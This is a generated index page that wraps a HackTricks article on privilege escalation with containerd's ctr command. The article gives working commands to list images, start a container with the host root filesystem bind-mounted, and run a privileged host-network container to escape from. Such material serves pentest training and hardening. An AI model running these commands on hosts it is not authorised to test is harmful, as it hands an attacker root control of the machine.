---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# Containerd (ctr) Privilege Escalation

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-linux-hardening-privilege-escalation-containerd-ctr-privilege-escalation` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Containerd (ctr) Privilege Escalation](../../topics/linux-hardening/containerd-ctr-privilege-escalation.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-linux-hardening-privilege-escalation-containerd-ctr-privilege-escalation |
| name | Containerd (ctr) Privilege Escalation |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation.md |

## Preserved Source Material

````yaml
_body: "# Containerd (ctr) Privilege Escalation\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Basic information\n\
  \nGo to the following link to learn **where `containerd` and `ctr` fit in the container stack**:\n\n\n{{#ref}}\ncontainer-security/runtimes-and-engines.md\n\
  {{#endref}}\n\n## PE 1\n\nif you find that a host contains the `ctr` command:\n\n```bash\nwhich ctr\n/usr/bin/ctr\n```\n\
  \nYou can list the images:\n\n```bash\nctr image list\nREF                                  TYPE                       \
  \                          DIGEST                                                                  SIZE      PLATFORMS \
  \  LABELS\nregistry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2\
  \ 100.1 MiB linux/amd64 -\nregistry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a\
  \ 302.8 MiB linux/amd64 -\n```\n\nAnd then **run one of those images mounting the host root folder to it**:\n\n```bash\n\
  ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash\n```\n\n## PE 2\n\nRun a\
  \ container privileged and escape from it.\\\nYou can run a privileged container as:\n\n```bash\n ctr run --privileged --net-host\
  \ -t registry:5000/modified-ubuntu:latest ubuntu bash\n```\n\nThen you can use some of the techniques mentioned in the following\
  \ page to **escape from it abusing privileged capabilities**:\n\n\n{{#ref}}\ncontainer-security/\n{{#endref}}\n\n{{#include\
  \ ../../banners/hacktricks-training.md}}"
_relative_path: linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation.md
````
